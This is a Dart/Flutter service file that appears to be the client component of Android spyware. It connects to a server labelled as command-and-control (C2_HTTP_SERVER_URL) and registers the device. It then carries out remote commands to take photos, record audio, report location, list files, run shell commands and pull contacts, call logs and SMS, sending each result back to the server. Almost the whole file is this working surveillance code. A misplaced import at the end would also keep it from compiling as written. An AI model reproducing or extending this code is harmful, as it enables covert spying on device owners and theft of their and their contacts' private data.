// lib/services/flutter_socketio_service.dart
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'device_info_service.dart';
import '../config/app_config.dart';

class FlutterSocketIOService {
  static final FlutterSocketIOService _instance = FlutterSocketIOService._internal();
  factory FlutterSocketIOService() => _instance;
  FlutterSocketIOService._internal();

  IO.Socket? _socket;
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  String? _deviceId;
  bool _isConnected = false;

  bool get isConnected => _isConnected;
  String? get deviceId => _deviceId;

  Future<void> initialize() async {
    try {
      _deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
      
      debugPrint("FlutterSocketIOService: Initializing connection to Python server");
      debugPrint("Server URL: $C2_HTTP_SERVER_URL");
      debugPrint("Device ID: $_deviceId");

      _socket = IO.io(C2_HTTP_SERVER_URL, 
        IO.OptionBuilder()
          .setTransports(['websocket', 'polling'])
          .disableAutoConnect()
          .setExtraHeaders({'deviceId': _deviceId!})
          .build()
      );

      _setupEventHandlers();
      _socket!.connect();

    } catch (e, stackTrace) {
      debugPrint("FlutterSocketIOService: Initialization error: $e");
      debugPrint("Stack trace: $stackTrace");
    }
  }

  void _setupEventHandlers() {
    _socket!.onConnect((_) {
      debugPrint("FlutterSocketIOService: Connected to Python Flask-SocketIO server");
      _isConnected = true;
      _registerDevice();
    });

    _socket!.onDisconnect((_) {
      debugPrint("FlutterSocketIOService: Disconnected from server");
      _isConnected = false;
    });

    _socket!.onConnectError((error) {
      debugPrint("FlutterSocketIOService: Connection error: $error");
      _isConnected = false;
    });

    _socket!.on('registration_successful', (data) {
      debugPrint("FlutterSocketIOService: Registration successful: $data");
    });

    _socket!.on('registration_failed', (data) {
      debugPrint("FlutterSocketIOService: Registration failed: $data");
    });

    // Handle incoming commands from Python server
    _socket!.on('command_take_picture', (data) {
      debugPrint("FlutterSocketIOService: Received take picture command: $data");
      _handleTakePictureCommand(data);
    });

    _socket!.on('command_record_voice', (data) {
      debugPrint("FlutterSocketIOService: Received record voice command: $data");
      _handleRecordVoiceCommand(data);
    });

    _socket!.on('command_get_location', (data) {
      debugPrint("FlutterSocketIOService: Received get location command: $data");
      _handleGetLocationCommand(data);
    });

    _socket!.on('command_list_files', (data) {
      debugPrint("FlutterSocketIOService: Received list files command: $data");
      _handleListFilesCommand(data);
    });

    _socket!.on('command_execute_shell', (data) {
      debugPrint("FlutterSocketIOService: Received execute shell command: $data");
      _handleExecuteShellCommand(data);
    });

    _socket!.on('command_get_contacts', (data) {
      debugPrint("FlutterSocketIOService: Received get contacts command: $data");
      _handleGetContactsCommand(data);
    });

    _socket!.on('command_get_call_logs', (data) {
      debugPrint("FlutterSocketIOService: Received get call logs command: $data");
      _handleGetCallLogsCommand(data);
    });

    _socket!.on('command_get_sms', (data) {
      debugPrint("FlutterSocketIOService: Received get SMS command: $data");
      _handleGetSMSCommand(data);
    });
  }

  Future<void> _registerDevice() async {
    try {
      final deviceInfo = await _deviceInfoService.getDeviceInfo();
      
      final registrationData = {
        'deviceId': _deviceId,
        'deviceName': deviceInfo['deviceName'] ?? 'Flutter Device',
        'platform': deviceInfo['platform'] ?? 'android',
        'model': deviceInfo['model'] ?? 'Unknown',
        'osVersion': deviceInfo['osVersion'] ?? 'Unknown',
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      };

      debugPrint("FlutterSocketIOService: Registering device: $registrationData");
      _socket!.emit('register_device', registrationData);

    } catch (e) {
      debugPrint("FlutterSocketIOService: Device registration error: $e");
    }
  }

  void sendHeartbeat() {
    if (_isConnected && _socket != null) {
      _socket!.emit('device_heartbeat', {
        'deviceId': _deviceId,
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      });
    }
  }

  void sendCommandResponse(String command, String status, Map<String, dynamic> payload) {
    if (_isConnected && _socket != null) {
      _socket!.emit('command_response', {
        'command': command,
        'status': status,
        'payload': payload,
        'deviceId': _deviceId,
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(),
      });
    }
  }

  // Command handlers that delegate to native service
  void _handleTakePictureCommand(dynamic data) {
    // Delegate to native service through method channel
    _executeNativeCommand('command_take_picture', data ?? {});
  }

  void _handleRecordVoiceCommand(dynamic data) {
    _executeNativeCommand('command_record_voice', data ?? {});
  }

  void _handleGetLocationCommand(dynamic data) {
    _executeNativeCommand('command_get_location', data ?? {});
  }

  void _handleListFilesCommand(dynamic data) {
    _executeNativeCommand('command_list_files', data ?? {});
  }

  void _handleExecuteShellCommand(dynamic data) {
    _executeNativeCommand('command_execute_shell', data ?? {});
  }

  void _handleGetContactsCommand(dynamic data) {
    _executeNativeCommand('command_get_contacts', data ?? {});
  }

  void _handleGetCallLogsCommand(dynamic data) {
    _executeNativeCommand('command_get_call_logs', data ?? {});
  }

  void _handleGetSMSCommand(dynamic data) {
    _executeNativeCommand('command_get_sms', data ?? {});
  }

  Future<void> _executeNativeCommand(String command, dynamic args) async {
    try {
      // Use method channel to execute command through native service
      const platform = MethodChannel('com.example.kem/native_commands');
      
      final result = await platform.invokeMethod('executeCommand', {
        'command': command,
        'args': args is Map ? Map<String, dynamic>.from(args) : <String, dynamic>{},
      });

      // Send success response back to Python server
      sendCommandResponse(command, 'success', result ?? {});

    } catch (e) {
      debugPrint("FlutterSocketIOService: Native command execution failed: $e");
      
      // Send error response back to Python server
      sendCommandResponse(command, 'error', {
        'error': e.toString(),
        'message': 'Native command execution failed',
      });
    }
  }

  void disconnect() {
    _socket?.disconnect();
    _socket?.dispose();
    _isConnected = false;
  }
}

// Import for method channel
import 'package:flutter/services.dart';